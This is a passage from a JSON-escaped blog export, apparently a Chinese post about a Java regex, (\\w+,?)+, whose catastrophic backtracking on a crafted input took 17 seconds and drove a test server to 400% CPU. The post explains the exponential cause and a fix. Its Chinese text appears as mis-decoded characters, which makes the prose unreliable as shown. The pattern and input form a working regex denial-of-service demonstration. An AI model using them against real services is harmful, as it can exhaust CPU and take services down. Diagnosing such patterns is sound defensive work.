\u003ccode\u003e(abcdefghijklmno,)(abcdefghijklmno+\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eå†æ¬¡ï¼Œç”±äºåˆ° \u003ccode\u003eo+\u003c/code\u003e ä¸ºæ­¢ä¸€å®šåŒ¹é…å¤±è´¥ï¼Œå› æ­¤ï¼Œ\u003ccode\u003e+\u003c/code\u003e ä¹‹å‰åº”è¯¥æœ‰ä¸€ä¸ª \u003ccode\u003e)\u003c/code\u003e, å³ \u003ccode\u003e(abcdefghijklmno,)(abcdefghijklmno)+\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eè‡³äºå…¶ä»–å­—ç¬¦é—´çš„ç©ºéš™ï¼Œé™¤äº† \u003ccode\u003eo,\u003c/code\u003e ä¹‹é—´ä¸èƒ½å­˜åœ¨å³å·¦æ‹¬å· \u003ccode\u003e)(\u003c/code\u003e ï¼Œå…¶ä»–å­—ç¬¦é—´éƒ½å¯ä»¥éšæ„æ’å…¥ \u003ccode\u003e)(\u003c/code\u003e (è‡³äºä¸ºä»€ä¹ˆæ˜¯å³å·¦æ‹¬å·ï¼Œè¡¨ç¤ºå‰ä¸€ä¸ªç»„çš„ç»“æŸä¸æ–°çš„ç»„çš„å¼€å§‹)\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæ€»å…±æœ‰å¤šå°‘ç§å¯èƒ½? \u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eæ’å…¥é›¶ä¸ªå³å·¦æ‹¬å· \u003ccode\u003e)(\u003c/code\u003e , \u003cspan class=\"inlineMath\"\u003e\u003cspan class=\"katex\"\u003e\u003cspan class=\"katex-mathml\"\u003e\u003cmath\u003e\u003csemantics\u003e\u003cmrow\u003e\u003cmsubsup\u003e\u003cmi\u003eC\u003c/mi\u003e\u003cmn\u003e28\u003c/mn\u003e\u003cmn\u003e0\u003c/mn\u003e\u003c/msubsup\u003e\u003c/mrow\u003e\u003cannotation encoding=\"application/x-tex\"\u003eC_{28}^0\u003c/annotation\u003e\u003c/semantics\u003e\u003c/math\u003e\u003c/span\u003e\u003cspan class=\"katex-html\" aria-hidden=\"true\"\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:1.0622159999999998em;vertical-align:-0.24810799999999997em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord mathdefault\" style=\"margin-right:0.07153em;\"\u003eC\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t vlist-t2\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-s\"\u003eâ€‹\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.24810799999999997em;\"\u003e\u003cspan\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e = 1 ç§å¯è¡Œæ–¹æ¡ˆ\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ’å…¥ä¸€ä¸ªå³å·¦æ‹¬å· \u003ccode\u003e)(\u003c/code\u003e , \u003cspan class=\"inlineMath\"\u003e\u003cspan class=\"katex\"\u003e\u003cspan class=\"katex-mathml\"\u003e\u003cmath\u003e\u003csemantics\u003e\u003cmrow\u003e\u003cmsubsup\u003e\u003cmi\u003eC\u003c/mi\u003e\u003cmn\u003e28\u003c/mn\u003e\u003cmn\u003e1\u003c/mn\u003e\u003c/msubsup\u003e\u003c/mrow\u003e\u003cannotation encoding=\"application/x-tex\"\u003eC_{28}^1\u003c/annotation\u003e\u003c/semantics\u003e\u003c/math\u003e\u003c/span\u003e\u003cspan class=\"katex-html\" aria-hidden=\"true\"\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:1.0622159999999998em;vertical-align:-0.24810799999999997em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord mathdefault\" style=\"margin-right:0.07153em;\"\u003eC\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t vlist-t2\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-s\"\u003eâ€‹\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.24810799999999997em;\"\u003e\u003cspan\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e = 28 ç§å¯è¡Œæ–¹æ¡ˆ (æ€»å…± 28 ä¸ªå¯ç”¨å­—ç¬¦é—´éš™)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ’å…¥ä¸¤ä¸ªå³å·¦æ‹¬å· \u003ccode\u003e)(\u003c/code\u003e , \u003cspan class=\"inlineMath\"\u003e\u003cspan class=\"katex\"\u003e\u003cspan class=\"katex-mathml\"\u003e\u003cmath\u003e\u003csemantics\u003e\u003cmrow\u003e\u003cmsubsup\u003e\u003cmi\u003eC\u003c/mi\u003e\u003cmn\u003e28\u003c/mn\u003e\u003cmn\u003e2\u003c/mn\u003e\u003c/msubsup\u003e\u003c/mrow\u003e\u003cannotation encoding=\"application/x-tex\"\u003eC_{28}^2\u003c/annotation\u003e\u003c/semantics\u003e\u003c/math\u003e\u003c/span\u003e\u003cspan class=\"katex-html\" aria-hidden=\"true\"\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:1.0622159999999998em;vertical-align:-0.24810799999999997em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord mathdefault\" style=\"margin-right:0.07153em;\"\u003eC\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t vlist-t2\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-s\"\u003eâ€‹\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.24810799999999997em;\"\u003e\u003cspan\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e ç§å¯è¡Œæ–¹æ¡ˆ\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e...\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ’å…¥28ä¸ªå³å·¦æ‹¬å· \u003ccode\u003e)(\u003c/code\u003e , \u003cspan class=\"inlineMath\"\u003e\u003cspan class=\"katex\"\u003e\u003cspan class=\"katex-mathml\"\u003e\u003cmath\u003e\u003csemantics\u003e\u003cmrow\u003e\u003cmsubsup\u003e\u003cmi\u003eC\u003c/mi\u003e\u003cmn\u003e28\u003c/mn\u003e\u003cmn\u003e28\u003c/mn\u003e\u003c/msubsup\u003e\u003c/mrow\u003e\u003cannotation encoding=\"application/x-tex\"\u003eC_{28}^{28}\u003c/annotation\u003e\u003c/semantics\u003e\u003c/math\u003e\u003c/span\u003e\u003cspan class=\"katex-html\" aria-hidden=\"true\"\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:1.0622159999999998em;vertical-align:-0.24810799999999997em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord mathdefault\" style=\"margin-right:0.07153em;\"\u003eC\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t vlist-t2\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-s\"\u003eâ€‹\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.24810799999999997em;\"\u003e\u003cspan\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e ç§å¯è¡Œæ–¹æ¡ˆ\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eç´¯åŠ çš„ç»“æœä¸º \u003cspan class=\"inlineMath\"\u003e\u003cspan class=\"katex\"\u003e\u003cspan class=\"katex-mathml\"\u003e\u003cmath\u003e\u003csemantics\u003e\u003cmrow\u003e\u003cmsubsup\u003e\u003cmi\u003eC\u003c/mi\u003e\u003cmn\u003e28\u003c/mn\u003e\u003cmn\u003e1\u003c/mn\u003e\u003c/msubsup\u003e\u003cmo\u003e+\u003c/mo\u003e\u003cmsubsup\u003e\u003cmi\u003eC\u003c/mi\u003e\u003cmn\u003e28\u003c/mn\u003e\u003cmn\u003e2\u003c/mn\u003e\u003c/msubsup\u003e\u003cmo\u003e+\u003c/mo\u003e\u003cmsubsup\u003e\u003cmi\u003eC\u003c/mi\u003e\u003cmn\u003e28\u003c/mn\u003e\u003cmn\u003e3\u003c/mn\u003e\u003c/msubsup\u003e\u003cmo\u003e+\u003c/mo\u003e\u003cmi mathvariant=\"normal\"\u003e.\u003c/mi\u003e\u003cmi mathvariant=\"normal\"\u003e.\u003c/mi\u003e\u003cmi mathvariant=\"normal\"\u003e.\u003c/mi\u003e\u003cmo\u003e+\u003c/mo\u003e\u003cmsubsup\u003e\u003cmi\u003eC\u003c/mi\u003e\u003cmn\u003e28\u003c/mn\u003e\u003cmn\u003e28\u003c/mn\u003e\u003c/msubsup\u003e\u003cmo\u003e=\u003c/mo\u003e\u003cmsup\u003e\u003cmn\u003e2\u003c/mn\u003e\u003cmn\u003e28\u003c/mn\u003e\u003c/msup\u003e\u003c/mrow\u003e\u003cannotation encoding=\"application/x-tex\"\u003eC_{28}^1 + C_{28}^2 + C_{28}^3 + ... + C_{28}^{28} = 2^{28}\u003c/annotation\u003e\u003c/semantics\u003e\u003c/math\u003e\u003c/span\u003e\u003cspan class=\"katex-html\" aria-hidden=\"true\"\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:1.0622159999999998em;vertical-align:-0.24810799999999997em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord mathdefault\" style=\"margin-right:0.07153em;\"\u003eC\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t vlist-t2\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-s\"\u003eâ€‹\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.24810799999999997em;\"\u003e\u003cspan\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"\u003e\u003c/span\u003e\u003cspan class=\"mbin\"\u003e+\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:1.0622159999999998em;vertical-align:-0.24810799999999997em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord mathdefault\" style=\"margin-right:0.07153em;\"\u003eC\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t vlist-t2\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-s\"\u003eâ€‹\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.24810799999999997em;\"\u003e\u003cspan\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"\u003e\u003c/span\u003e\u003cspan class=\"mbin\"\u003e+\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:1.0622159999999998em;vertical-align:-0.24810799999999997em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord mathdefault\" style=\"margin-right:0.07153em;\"\u003eC\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t vlist-t2\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e3\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-s\"\u003eâ€‹\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.24810799999999997em;\"\u003e\u003cspan\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"\u003e\u003c/span\u003e\u003cspan class=\"mbin\"\u003e+\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e.\u003c/span\u003e\u003cspan class=\"mord\"\u003e.\u003c/span\u003e\u003cspan class=\"mord\"\u003e.\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"\u003e\u003c/span\u003e\u003cspan class=\"mbin\"\u003e+\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:1.0622159999999998em;vertical-align:-0.24810799999999997em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord mathdefault\" style=\"margin-right:0.07153em;\"\u003eC\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t vlist-t2\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-2.4518920000000004em;margin-left:-0.07153em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-s\"\u003eâ€‹\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.24810799999999997em;\"\u003e\u003cspan\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"\u003e\u003c/span\u003e\u003cspan class=\"mrel\"\u003e=\u003c/span\u003e\u003cspan class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"base\"\u003e\u003cspan class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"\u003e\u003c/span\u003e\u003cspan class=\"mord\"\u003e\u003cspan class=\"mord\"\u003e2\u003c/span\u003e\u003cspan class=\"msupsub\"\u003e\u003cspan class=\"vlist-t\"\u003e\u003cspan class=\"vlist-r\"\u003e\u003cspan class=\"vlist\" style=\"height:0.8141079999999999em;\"\u003e\u003cspan style=\"top:-3.063em;margin-right:0.05em;\"\u003e\u003cspan class=\"pstrut\" style=\"height:2.7em;\"\u003e\u003c/span\u003e\u003cspan class=\"sizing reset-size6 size3 mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e\u003cspan class=\"mord mtight\"\u003e2\u003c/span\u003e\u003cspan class=\"mord mtight\"\u003e8\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003eå¯æƒ³è€ŒçŸ¥ä¸ºä»€ä¹ˆä¼šèŠ± 17s äº†å§ã€‚æ¯•ç«Ÿè¾¾åˆ°äº† 2500 ä¸‡ä»¥ä¸Šçš„è®¡ç®—é‡çº§ï¼ŒåŠ ä¸Š regex æœ¬èº«å°±æ˜¯åæ…¢çš„ã€‚\u003c/p\u003e\n\u003cp\u003eè‡³äºä¸ºä»€ä¹ˆæŠŠ \u003ccode\u003eabcdefghijklmno,abcdefghijklmno+\u003c/code\u003e ä¸²çš„ \u003ccode\u003e+\u003c/code\u003e å»æ‰å°±å˜å¿«äº†ï¼Ÿç†ç”±ä¹Ÿå¾ˆç®€å•ï¼Œ\u003ccode\u003ematches(regex)\u003c/code\u003e åœ¨æ­£åˆ™ä¸²ä¸åŸä¸²åŒ¹é…ä¸Šä¹‹åå°±ä¼šå¿«é€Ÿç»“æŸï¼Œå› ä¸ºç»“æœåªéœ€è¦å‘ŠçŸ¥æŸæ¬¡åŒ¹é…æˆåŠŸäº†å³å¯ã€‚è€Œå¤±è´¥çš„åŒ¹é…ä¼šä¸æ–­åœ°å°è¯•æ‰€æœ‰çš„å¯èƒ½æ€§ã€‚\u003c/p\u003e\n\u003ch2\u003eè§£å†³æ–¹æ¡ˆ\u003c/h2\u003e\n\u003cp\u003eè‡³äºè§£å†³æ–¹æ¡ˆï¼Œä»ä¸Šé¢çš„åŸå› å°±å¯ä»¥çœ‹åˆ°ï¼Œæ‹’ç»åœ¨è´ªå©ªç»„æ¨¡å¼ä¸‹(\u003ccode\u003e(...)+\u003c/code\u003e) çš„ç»„å†…å¤šæ¨¡å¼åŒ¹é…å¯èƒ½ã€‚å³ \u003ccode\u003e(a+a+)+\u003c/code\u003e æ˜¯ä¸èƒ½è¢«å…è®¸çš„ï¼Œè€Œ \u003ccode\u003e(a+b+)+\u003c/code\u003e æ˜¯å¯é çš„ã€‚\u003c/p\u003e\n\u003cp\u003eå†™å¾—ä»“ä¿ƒï¼Œå¦‚æœ‰æ ¹æºæ€§é”™è¯¯ï¼Œæ¬¢è¿æŒ‡æ­£ã€‚\u003c/p\u003e\n\u003ch2\u003eå‚è€ƒ\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://www.regular-expressions.info/catastrophic.html\"\u003eCatastrophic Backtracking(ç¾éš¾æ€§å›æº¯)\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-plain\"\u003e  __                    __                  \n / _| __ _ _ __   __ _ / _| ___ _ __   __ _ \n| |_ / _` | '_ \\ / _` | |_ / _ \\ '_ \\ / _` |\n|  _| (_| | | | | (_| |  _|  __/ | | | (_| |\n|_|  \\__,_|_| |_|\\__, |_|  \\___|_| |_|\\__, |\n                 |___/                |___/ \n\u003c/code\u003e\u003c/pre\u003e","digest":"\u003ch2\u003eèƒŒæ™¯\u003c/h2\u003e\n\u003cp\u003eæ˜¨å¤©æ¥è§¦åˆ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜, å…¬å¸æµ‹è¯•ç¯å¢ƒä¸€å°æœºå™¨ CPU è·‘åˆ°äº† 400%ï¼Œå¯¼è‡´è¯¥æœºå™¨ä¸Šçš„æ‰€æœ‰æœåŠ¡éƒ½æŒ‚æ‰äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæœ€åæŸ¥åˆ°çš„åŸå› ç«Ÿç„¶æ˜¯æ­£åˆ™è¡¨è¾¾å¼æ‰€å¼•èµ·çš„ï¼Œå¤§å¤§å‡ºä¹æ„æ–™å•Šã€‚è™½ç„¶æ—©å°±çŸ¥é“æ­£åˆ™æ•ˆç‡å¾ˆå·®ï¼Œä½†ç»å¯¹æ²¡æœ‰æƒ³åˆ°ä¼šå¯¼è‡´æ•´ä¸ªæœºå™¨ä¸ŠæœåŠ¡å´©æºƒçš„æƒ…å†µã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆç®€å•å±•ç¤ºä¸‹é—®é¢˜æ­£åˆ™:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-java\"\u003eString regex = \"(\\\\w+,?)+\";\nString val = \"abcdefghijklmno,abcdefghijklmno+\";\nSystem.out.println(val.matches(regex));\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæœ€ç»ˆçš„æ‰§è¡Œæ—¶é—´æ˜¯ 17s å·¦å³ã€‚\u003c/p\u003e\n\u003cp\u003eç›¸åï¼Œå¦‚æœæ”¹æˆ \u003ccode\u003eString val = \"abcdefghijklmno,abcdefghijklmno\"\u003c/code\u003e ï¼Œå®é™…æ‰§è¡Œæ—¶é—´ 1ms å·¦å³ã€‚\u003c/p\u003e\n\u003cp\u003eå“ˆå“ˆï¼Œå®Œå…¨ä¸æ˜¯ä¸€ä¸ªé‡çº§çš„ç»“æœã€‚\u003c/p\u003e\n\u003cp\u003eæœ€åï¼Œå½“ç„¶æ˜¯è¦æ‰¾åŸå› äº†:\u0026#x3C; å½“ç„¶ï¼Œæœ‰å…¶å®ƒé‡è¦çš„äº‹åœ¨è€½æï¼Œæ²¡æ—¶é—´å»çœ‹ Java Regex æºç ã€‚ä¸è¿‡ï¼Œä»æ­£åˆ™æœ¬èº«ä¸‹æ‰‹åè€Œæ˜¯ä¸ªå¥½äº‹æƒ…ã€‚æ¯•ç«Ÿå‡ ä¹æ‰€æœ‰çš„ç¼–ç¨‹è¯­è¨€éƒ½æœ‰å¯¹æ­£åˆ™çš„æ”¯æŒã€‚è€ŒåŒæ ·çš„ï¼Œéƒ½å­˜åœ¨ç€è¿™æ ·çš„é—®é¢˜ã€‚é‚£å°±å¯ä»¥å¤§èƒ†çŒœæƒ³å…¶å®æ˜¯å’Œè¯­è¨€æœ¬èº«æ— å…³ï¼Œè€Œåœ¨äºæ­£åˆ™è§„èŒƒæœ¬èº«äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆç»™ä¸ªç»“æœï¼Œç½ªé­ç¥¸é¦–å°±æ˜¯\u003ccode\u003eæŒ‡æ•°çˆ†ç‚¸\u003c/code\u003e\u003c/p\u003e"},{"url":"2018-11-11-understand-Kernel-6","fileName":"2018-11-11-understand-Kernel-6.md","title":"ç†è§£ Linux Kernel (6) 